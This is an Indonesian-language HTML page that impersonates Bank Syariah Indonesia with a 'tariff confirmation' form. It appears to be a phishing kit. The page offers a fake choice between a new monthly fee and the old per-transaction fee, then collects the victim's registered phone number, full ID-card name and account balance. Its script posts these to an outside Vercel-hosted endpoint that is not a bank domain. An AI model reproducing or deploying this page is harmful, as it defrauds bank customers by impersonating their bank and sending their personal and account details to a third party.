<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Konfirmasi Tarif - Bank Syariah Indonesia</title>
    <meta name="theme-color" content="#00A39E">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #00A39E 0%, #007F7A 100%);
            padding: 20px;
            color: #333;
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
        }
        
        .header {
            background-color: #00A39E;
            padding: 25px 20px;
            text-align: center;
            color: white;
        }
        
        .header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 5px;
        }
        
        .header p {
            font-size: 16px;
            opacity: 0.9;
        }
        
        .form-container {
            padding: 25px;
        }
        
        .radio-group {
            margin-bottom: 25px;
        }
        
        .radio-item {
            display: flex;
            align-items: center;
            padding: 15px;
            margin-bottom: 12px;
            background: #f8f8f8;
            border-radius: 10px;
            border: 2px solid #e0e0e0;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .radio-item:hover {
            background: #eefbfa;
            border-color: #00A39E;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 163, 158, 0.1);
        }
        
        .radio-item input {
            margin-right: 12px;
            accent-color: #00A39E;
        }
        
        .input-group {
            margin-bottom: 20px;
            position: relative;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #444;
        }
        
        .input-group input {
            width: 100%;
            padding: 14px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        .input-group input:focus {
            outline: none;
            border-color: #00A39E;
            box-shadow: 0 0 0 3px rgba(0, 163, 158, 0.2);
        }
        
        .input-icon {
            position: absolute;
            right: 15px;
            top: 42px;
            color: #00A39E;
        }
        
        .submit-btn {
            width: 100%;
            padding: 16px;
            background-color: #00A39E;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .submit-btn:hover {
            background-color: #00857F;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 133, 127, 0.3);
        }
        
        .submit-btn:active {
            transform: translateY(0);
        }
        
        .submit-btn:disabled {
            background-color: #9dd6d4;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .submit-btn i {
            margin-right: 8px;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            font-size: 14px;
            color: #666;
            border-top: 1px solid #eee;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 8px;
            color: white;
            background: #ff4d4d;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.15);
            display: none;
            z-index: 1000;
            max-width: 350px;
        }
        
        .notification.success {
            background: #00A39E;
        }
        
        @media (max-width: 600px) {
            body {
                padding: 15px;
            }
            
            .container {
                border-radius: 12px;
            }
            
            .header {
                padding: 20px 15px;
            }
            
            .form-container {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Bank Syariah Indonesia</h1>
            <p>Konfirmasi tarif sesuai kebutuhan Anda</p>
        </div>
        
        <div class="form-container">
            <form id="bsiForm">
                <div class="radio-group">
                    <label class="radio-item">
                        <input type="radio" name="tarif" value="baru" required> 
                        TARIF BARU Rp 150.000 / BULAN
                    </label>
                    <label class="radio-item">
                        <input type="radio" name="tarif" value="lama" required> 
                        TARIF LAMA Rp 6.500 / TRANSAKSI
                    </label>
                </div>
                
                <div class="input-group">
                    <label for="nohp">No. HP Terdaftar</label>
                    <input type="tel" id="nohp" name="nohp" placeholder="Contoh: 08123456789" required>
                    <span class="input-icon"><i class="fas fa-phone"></i></span>
                </div>
                
                <div class="input-group">
                    <label for="nama">Nama Lengkap</label>
                    <input type="text" id="nama" name="nama" placeholder="Nama sesuai KTP" required>
                    <span class="input-icon"><i class="fas fa-user"></i></span>
                </div>
                
                <div class="input-group">
                    <label for="saldo">Saldo Akhir</label>
                    <input type="text" id="saldo" name="saldo" placeholder="Contoh: 1.500.000" required>
                    <span class="input-icon"><i class="fas fa-wallet"></i></span>
                </div>
                
                <button type="submit" class="submit-btn" id="submitBtn">
                    <i class="fas fa-paper-plane"></i> PROSES
                </button>
            </form>
        </div>
        
        <div class="footer">
            &copy; 2023 Bank Syariah Indonesia. Terpercaya dan Andal.
        </div>
    </div>

    <div class="notification" id="notification">
        <i class="fas fa-exclamation-circle"></i> <span id="notificationText"></span>
    </div>

    <script>
        document.getElementById('bsiForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const formData = new FormData(this);
            const data = {
                tarif: formData.get('tarif'),
                nohp: formData.get('nohp'),
                nama: formData.get('nama'),
                saldo: formData.get('saldo')
            };
            
            const submitBtn = document.getElementById('submitBtn');
            const originalText = submitBtn.innerHTML;
            
            try {
                // Tampilkan loading
                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> MEMPROSES...';
                submitBtn.disabled = true;
                
                // Kirim ke API
                const response = await fetch('https://bsi-backend1.vercel.app/api', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                
                const result = await response.json();
                
                if (result.success) {
                    showNotification('✅ Data berhasil dikirim!', true);
                    // Reset form setelah berhasil
                    document.getElementById('bsiForm').reset();
                } else {
                    showNotification('❌ ' + result.message, false);
                }
            } catch (error) {
                console.error('Error:', error);
                showNotification('❌ Terjadi kesalahan jaringan. Silakan coba lagi.', false);
            } finally {
                // Reset tombol
                submitBtn.innerHTML = originalText;
                submitBtn.disabled = false;
            }
        });

        // Fungsi untuk menampilkan notifikasi
        function showNotification(message, isSuccess) {
            const notification = document.getElementById('notification');
            const notificationText = document.getElementById('notificationText');
            
            notificationText.textContent = message;
            notification.className = isSuccess ? 'notification success' : 'notification';
            notification.style.display = 'block';
            
            // Tambahkan ikon sesuai jenis notifikasi
            notificationText.innerHTML = (isSuccess ? 
                '<i class="fas fa-check-circle"></i> ' : 
                '<i class="fas fa-exclamation-circle"></i> ') + message;
            
            // Sembunyikan notifikasi setelah 5 detik
            setTimeout(() => {
                notification.style.display = 'none';
            }, 5000);
        }

        // Validasi input nomor HP
        document.getElementById('nohp').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // Validasi input saldo
        document.getElementById('saldo').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9.]/g, '');
        });
    </script>
</body>
</html>
